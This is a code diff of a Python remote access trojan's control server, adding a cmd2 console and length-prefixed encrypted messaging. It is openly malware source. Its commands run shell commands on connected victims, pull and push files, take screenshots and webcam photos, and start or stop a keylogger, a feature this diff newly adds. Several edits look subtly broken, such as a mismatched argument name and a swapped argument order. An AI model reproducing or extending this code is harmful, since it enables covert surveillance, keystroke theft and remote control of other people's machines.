@@ -5,6 +5,9 @@ import socket
 import json
 import threading
 import os
+import cmd2
+import argparse
+import math
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 # non-standard libraries
 import texttable
@@ -14,75 +17,8 @@ class Server:
     def __init__(self):
         self.timeout = 30
         self.zip_compression_level = 0
-        self.camera_port = 0
-        self.percentage_dec_places = 1
         self.connection = Connection()
-
-    def main(self):
-        while True:
-            entered = input("[+] ")
-            if entered:
-                command = entered[0].lower()
-                attribute = entered[2:].split(" @ ")
-
-                if command == "h":
-                    self.print_help()
-                elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["timeout", "zip_compression", "camera_port", "percentage_dec_places"]:
-                    self.set_option(attribute[0].split()[0].lower(), attribute[0].split()[1])
-                elif command == "l" and len(attribute):
-                    self.list_sessions(self.get_conn_fgoi(attribute[0].split()))
-                elif command == "t" and len(attribute) == 2:
-                    self.edit_tag(attribute[0], self.get_conn_fgoi(attribute[1].split()))
-                elif command == "r" and len(attribute):
-                    self.close_session(self.get_conn_fgoi(attribute[0].split()))
-                elif command == "g" and len(attribute) == 2 and attribute[0].split()[0].lower() in ["add", "rm"]:
-                    self.edit_group(attribute[0].split()[0].lower(), self.get_conn_fgoi(attribute[0].split()[0:]), attribute[1].split())
-                elif command == "f" and len(attribute) == 2 and attribute[0].split()[0] in ["set", "get"]:
-                    if attribute[0].split()[0] == "set":
-                        if len(attribute[0].split()) == 2:
-                            self.cwd(attribute[0].split()[0], attribute[0].split()[1], self.get_conn_fgoi(attribute[1].split()))
-                        else:
-                            print("[-] InvalidInputError")
-                    elif attribute[0].split()[0] == "get":
-                        if len(attribute[0].split()) == 1:
-                            self.cwd(attribute[0].split()[0], "", self.get_conn_fgoi(attribute[1].split()))
-                        else:
-                            print("[-] InvalidInputError")
-                elif command == "c" and len(attribute) == 2:
-                    self.execute_command(attribute[0], self.get_conn_fgoi(attribute[1].split()))
-                elif command == "d" and len(attribute) == 3:
-                    self.download_file(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
-                elif command == "u" and len(attribute) == 3:
-                    self.upload_file(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
-                elif command == "s" and len(attribute) == 2 and len(attribute[0].split()) == 2:
-                    self.make_screenshot(attribute[0].split()[0], attribute[0].split()[1], self.get_conn_fgoi(attribute[1].split()))
-                elif command == "z" and len(attribute) == 3:
-                    self.zip_file_or_folder(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
-                elif command == "w" and len(attribute) == 2:
-                    self.capture_camera_picture(attribute[0], self.get_conn_fgoi(attribute[1].split()))
-                elif command == "x":
-                    self.exit_server()
-                    break
-                else:
-                    print("[-] InvalidInputError")
-            else:
-                print("[-] InvalidInputError")
-
-    def print_help(self):
-        print("h show this page")
-        print("o [timeout/zip_compression/camera_port] [value] set option")
-        print("l [clients] list clients")
-        print("t [tag] @ [clients] change tag")
-        print("r [clients] close and remove connection")
-        print("g [add/rm] [clients] @ [group name] change group")
-        print("f [set/get] [path] @ [clients] set or get current working directory")
-        print("c [command] @ [clients]  execute console command")
-        print("d [path to open] @ [path to save] @ [clients] download file from target")
-        print("u [path to open] @ [path to save] @ [clients] upload file to target")
-        print("s [monitor] [path_to_save] @ [clients] capture screenshot")
-        print("z [path_to_open] @ [path_to_save] @ [clients] zip file or folder")
-        print("w [path_to_save] @ [clients] capture camera picture")
-        print("x exit server")
+        self.user_interface = UserInterface(self)
 
     def exit_server(self):
         self.connection.sock.close()
@@ -112,14 +48,6 @@ class Server:
                     self.zip_compression_level = int(value)
             except ValueError:
                 print("[-] InvalidCompressionLevel")
-        elif option == "camera_port":
-            try:
-                if not int(value) < 0:
-                    print("[-] InvalidCameraPort")
-                else:
-                    self.camera_port = int(value)
-            except ValueError:
-                print("[-] InvalidCameraPort")
 
     def edit_tag(self, tag, connections):
         for index, session in enumerate(self.connection.sessions):
@@ -138,38 +66,18 @@ class Server:
                 session["connection"].close()
                 self.connection.sessions.remove(session)
 
-    def edit_group(self, mode, connections, group_names):
-        if mode == "add":
-            for index, session in enumerate(self.connection.sessions):
-                if session["connection"] in connections:
-                    for name in group_names:
-                        if name not in self.connection.sessions[index]["groups"]:
-                            self.connection.sessions[index]["groups"].append(name)
-                        else:
-                            print("[-] TargetAlreadyInGroup")
-
-        elif mode == "rm":
-            for index, session in enumerate(self.connection.sessions):
-                if session["connection"] in connections:
-                    for name in group_names:
+    def edit_group(self, connections_to_add, connections_to_remove, group_names):
+        for index, session in enumerate(self.connection.sessions):
+            if session["connection"] in connections_to_remove:
+                for name in group_names:
+                    if name != "all":  # can't remove client from 'all' group
                         try:
                             self.connection.sessions[index]["groups"].remove(name)
                         except ValueError:
-                            print("[-] TargetNotInGroup")
-
-    def cwd(self, mode, path, connections):
-        request = {"cmd": "f",
-                   "mode": mode,
-                   "path": path,
-                   "timeout": self.timeout}
-        for connection in connections:
-            self.connection.send(request, connection)
-            response = self.connection.recv(connection)
-
-            if response["data"]:
-                print(response["data"])
-            if response["error"]:
-                print(f"[-] {response['error']}")
+                            pass
+            if session["connection"] in connections_to_add:
+                for name in group_names:
+                    self.connection.sessions[index]["groups"].add(name)
 
     def execute_command(self, exe, connections):
         request = {"cmd": "c",
@@ -202,7 +110,7 @@ class Server:
     def upload_file(self, path_to_open, path_to_save, connections):
         request = {"cmd": "u",
                    "save_path": path_to_save,
-                   "data": str()}
+                   "data": bytes()}
         try:
             with open(path_to_open, "rb") as file:
                 request["data"] = base64.b64encode(file.read()).decode(self.connection.CODEC)
@@ -229,9 +137,9 @@ class Server:
             if response["error"]:
                 print(f"[-] {response['error']}")
 
-    def zip_file_or_folder(self, path_to_open, path_to_save, connections):
+    def zip_file_or_folder(self, compression_level, path_to_open, path_to_save, connections):
         request = {"cmd": "z",
-                   "comp_lvl": self.zip_compression_level,
+                   "comp_lvl": compression_level,
                    "open_path": path_to_open,
                    "save_path": path_to_save,
                    "timeout": self.timeout}
@@ -242,9 +150,9 @@ class Server:
             if response["error"]:
                 print(f"[-] {response['error']}")
 
-    def capture_camera_picture(self, path_to_save, connections):
+    def capture_camera_picture(self, port, path_to_save, connections):
         request = {"cmd": "w",
-                   "cam_port": self.camera_port,
+                   "cam_port": port,
                    "save_path": path_to_save,
                    "timeout": self.timeout}
         for connection in connections:
@@ -254,23 +162,24 @@ class Server:
             if response["error"]:
                 print(f"[-] {response['error']}")
 
-    def get_conn_fgoi(self, objects):  # get connections from groups and/or indices
-        connections = list()
-        for goi in objects:
-            for index, session in enumerate(self.connection.sessions):
-                if session["connection"] not in connections:
-                    if goi in session["groups"]:
-                        connections.append(session["connection"])
-                    elif goi == str(index):
-                        connections.append(session["connection"])
-        return connections
+    def log_keys(self, action, filename, connections):
+        request = {"cmd": "k",
+                   "action": action,
+                   "save_path": filename}
+        for connection in connections:
+            self.connection.send(request, connection)
+            response = self.connection.recv(connection)
+
+            if response["error"]:
+                print(f"[-] {response['error']}")
+            if response["data"]:
+                print(response['data'])
 
 
 class Connection:
     def __init__(self):
         self.CODEC = "utf8"
         self.PACKET_SIZE = 1024
-        self.END_MARKER = "-".encode(self.CODEC)
         self.sessions = list()
 
         HOST = "127.0.0.1"
@@ -288,6 +197,17 @@ class Connection:
         self.accept_new_connections_process.start()
         print("[*] waiting for clients")
 
+    def get_conn_fgoi(self, objects):  # get connections from groups and/or indices
+        connections = list()
+        for goi in objects:
+            for index, session in enumerate(self.sessions):
+                if session["connection"] not in connections:
+                    if goi in session["groups"]:
+                        connections.append(session["connection"])
+                    elif goi == str(index):
+                        connections.append(session["connection"])
+        return connections
+
     def accept_new_connections(self, sock):
         while True:
             try:
@@ -300,7 +220,7 @@ class Connection:
                            "address": address,
                            "port": port,
                            "tag": "no tag",
-                           "groups": ["all"]}
+                           "groups": {"all"}}
                 self.sessions.append(session)
 
     # credit: https://stackoverflow.com/questions/1094841/reusable-library-to-get-human-readable-version-of-file-size
@@ -311,36 +231,40 @@ class Connection:
             num /= 1024.0
         return f"{num:3.1f} Yi{suffix}"
 
-    def send(self, data: dict, connection):
-        data = bytearray(base64.b64encode(self.encrypt(json.dumps(data).encode(self.CODEC))) + self.END_MARKER)
+    def send(self, data: dict, connection, progress_print=True):
+        data = self.encrypt(json.dumps(data).encode(self.CODEC))
         len_data_total = len(data)
+        total_packets = math.ceil(len_data_total / self.PACKET_SIZE)
+        connection.sendall(str(len_data_total).encode("utf8"))
         try:
-            while data:
-                connection.send(data[:self.PACKET_SIZE])
-                del data[:self.PACKET_SIZE]
-                len_data_current = len_data_total - len(data)
-                sys.stdout.write(f"\r[*] sending... {round(len_data_current / (len_data_total / 100), 1)}% [{self.format_byte_length(len_data_current)} / {self.format_byte_length(len_data_total)}] complete")
-                sys.stdout.flush()
+            for packet_number in range(total_packets):
+                connection.sendall(data[packet_number*self.PACKET_SIZE:(packet_number+1)*self.PACKET_SIZE])
+                if progress_print:
+                    sys.stdout.write(f"\r[*] sending {self.format_byte_length(len_data_total)} to {packet_number + 1 / (total_packets / 100)}% complete")
+                    sys.stdout.flush()
         except socket.error as error:
-            print(f"\r[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
-        print()
+            if progress_print:
+                sys.stdout.write(f"\r[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
+                sys.stdout.flush()
+        if progress_print:
+            print()
 
-    def recv(self, connection) -> dict:
-        header = bytearray()
+    def recv(self, connection, progress_print=True) -> dict:
+        header = int(connection.recv(self.PACKET_SIZE).decode("utf8"))
         data = bytearray()
         try:
-            while not header.endswith(self.END_MARKER):
-                header.extend(connection.recv(self.PACKET_SIZE))
-            header = json.loads(self.decrypt(base64.b64decode(header[:-1])).decode(self.CODEC))
-            while not data.endswith(self.END_MARKER):
+            for _ in range(math.ceil(header / self.PACKET_SIZE)):
                 data.extend(connection.recv(self.PACKET_SIZE))
-                sys.stdout.write(f"\r[*] receiving... {round(len(data) / (header['length'] / 100), 1)}% [{self.format_byte_length(len(data))} / {self.format_byte_length(header['length'])}] complete")
-                sys.stdout.flush()
+                if progress_print:
+                    sys.stdout.write(f"\r[*] receiving {self.format_byte_length(header)} to {round(len(data) / (header / 100), 1)}% complete")
+                    sys.stdout.flush()
         except socket.error as error:
-            sys.stdout.write(f"\r[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
-            sys.stdout.flush()
-        print()
-        return json.loads(self.decrypt(base64.b64decode(data[:-1])).decode(self.CODEC))
+            if progress_print:
+                sys.stdout.write(f"\r[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
+                sys.stdout.flush()
+        if progress_print:
+            print()
+        return json.loads(self.decrypt(bytes(data)).decode(self.CODEC))
 
     def encrypt(self, data):
         nonce = os.urandom(12)
@@ -355,6 +279,154 @@ class Connection:
                 return index
 
 
+class UserInterface(cmd2.Cmd):
+    exit_parser = argparse.ArgumentParser(prog="exit")
+
+    list_parser = argparse.ArgumentParser(prog="list")
+    list_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
+
+    opt_parser = argparse.ArgumentParser(prog="opt")
+    opt_parser.add_argument("-o", "--option", required=True, type=str, help="name of the option to edit")
+    opt_parser.add_argument("-v", "--value", required=True, type=int, help="value to change the option to")
+
+    tag_parser = argparse.ArgumentParser(prog="tag")
+    tag_parser.add_argument("-t", "--tag", required=True, type=str, help="value to change the tag to")
+    tag_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
+
+    close_parser = argparse.ArgumentParser(prog="close")
+    close_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
+
+    group_parser = argparse.ArgumentParser(prog="group")
+    mode_group = group_parser.add_mutually_exclusive_group(required=True)
+    mode_group.add_argument("-a", "--add", nargs="+", help="sessions to add to groups", default=[])
+    mode_group.add_argument("-r", "--rm", nargs="+", help="sessions to rm from groups", default=[])
+    group_parser.add_argument("-g", "--groups", nargs="+", required=True, help="groups to add/rm the sessions to/from")
+
+    exe_parser = argparse.ArgumentParser(prog="exe")
+    exe_parser.add_argument("-e", "--exe", required=True, type=str, help="command to execute")
+    exe_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
+
+    down_parser = argparse.ArgumentParser(prog="down")
+    down_parser.add_argument("-r", "--read", required=True, type=str, help="")
+    down_parser.add_argument("-w", "--write", required=True, type=str)
+    down_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
+
+    up_parser = argparse.ArgumentParser(prog="up")
+    up_parser.add_argument("-r", "--read", required=True, type=str)
+    up_parser.add_argument("-w", "--write", required=True, type=str)
+    up_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
+
+    screen_parser = argparse.ArgumentParser(prog="screen")
+    screen_parser.add_argument("-m", "--monitor", required=True, type=int)
+    screen_parser.add_argument("-w", "--write", required=True, type=str)
+    screen_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
+
+    zip_parser = argparse.ArgumentParser(prog="zip")
+    zip_parser.add_argument("-c", "--compression", default=1, type=int)
+    zip_parser.add_argument("-r", "--read", required=True, type=str)
+    zip_parser.add_argument("-w", "--write", required=True, type=str)
+    zip_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
+
+    cam_parser = argparse.ArgumentParser(prog="cam")
+    cam_parser.add_argument("-p", "--port", required=True, type=int)
+    cam_parser.add_argument("-w", "--write", required=True, type=str)
+    cam_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
+
+    log_keys_parser = argparse.ArgumentParser(prog="logger")
+    log_keys_parser.add_argument("-a", "--action", required=True, type=str, choices=["start", "stop", "status"])
+    log_keys_parser.add_argument("-f", "--file", default="log.txt", type=str)
+    log_keys_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
+
+    def __init__(self, server):
+        super().__init__()
+        self.server = server
+        self.prompt = "[+] "
+
+        # delete some builtins
+        del cmd2.Cmd.do_py
+        del cmd2.Cmd.do_run_pyscript
+        del cmd2.Cmd.do_run_script
+        del cmd2.Cmd.do_quit
+        del cmd2.Cmd.do_shortcuts
+        del cmd2.Cmd.do_alias
+        del cmd2.Cmd.do_macro
+
+    def poutput(self, msg='', *, end: str = '\n'):
+        super().poutput(msg)
+
+    def pinfo(self, msg=''):
+        super().poutput(f"[*] {msg}")
+
+    def perror(self, msg='', *, end: str = '\n', apply_style: bool = True):
+        super().perror(f"[-] {msg}")
+
+    @cmd2.decorators.with_argparser(list_parser)
+    def do_list(self, args):
+        """List connected sessions"""
+        self.server.list_sessions(self.server.connection.get_conn_fgoi(args.sessions))
+
+    @cmd2.decorators.with_argparser(opt_parser)
+    def do_opt(self, args):
+        """Edit option value"""
+        self.server.set_option(args.option, args.value)
+
+    @cmd2.decorators.with_argparser(exit_parser)
+    def do_exit(self, _):
+        """Exit server and close socket (not closing sessions)"""
+        self.server.exit_server()
+        return True
+
+    @cmd2.decorators.with_argparser(tag_parser)
+    def do_tag(self, args):
+        """Edit sessions tag"""
+        self.server.edit_tag(self.server.connection.get_conn_fgoi(args.sessions), args.tag)
+
+    @cmd2.decorators.with_argparser(close_parser)
+    def do_close(self, args):
+        """Close and remove session"""
+        self.server.close_session(self.server.connection.get_conn_fgoi(args.sessions))
+
+    @cmd2.decorators.with_argparser(group_parser)
+    def do_group(self, args):
+        """Edit sessions groups memberships"""
+        self.server.edit_group(self.server.connection.get_conn_fgoi(args.add), self.server.connection.get_conn_fgoi(args.rm), args.groups)
+
+    @cmd2.decorators.with_argparser(exe_parser)
+    def do_exe(self, args):
+        """Remote execute terminal command"""
+        self.server.execute_command(args.exe, self.server.connection.get_conn_fgoi(args.sessions))
+
+    @cmd2.decorators.with_argparser(down_parser)
+    def do_down(self, args):
+        """Download file from client"""
+        self.server.download_file(args.read, args.write, self.server.connection.get_conn_fgoi(args.sessions))
+
+    @cmd2.decorators.with_argparser(up_parser)
+    def do_up(self, args):
+        """Upload file to client"""
+        self.server.upload_file(args.read, args.write, self.server.connection.get_conn_fgoi(args.sessions))
+
+    @cmd2.decorators.with_argparser(screen_parser)
+    def do_screen(self, args):
+        """Capture screen image"""
+        self.server.make_screenshot(args.monitor, args.write, self.server.connection.get_conn_fgoi(args.sessions))
+
+    @cmd2.decorators.with_argparser(zip_parser)
+    def do_zip(self, args):
+        """Compress to zip archive"""
+        self.server.zip_file_or_folder(args.compression_level, args.read, args.write, self.server.connection.get_conn_fgoi(args.sessions))
+
+    @cmd2.decorators.with_argparser(cam_parser)
+    def do_cam(self, args):
+        """Capture camera image"""
+        self.server.capture_camera_picture(args.port, args.write, self.server.connection.get_conn_fgoi(args.sessions))
+
+    @cmd2.decorators.with_argparser(log_keys_parser)
+    def do_logger(self, args):
+        """Start/Stop keylogger"""
+        self.server.log_keys(args.action, args.file, self.server.connection.get_conn_fgoi(args.sessions))
+
+
 if __name__ == "__main__":
     server = Server()
-    server.main()
+    server.user_interface.cmdloop()
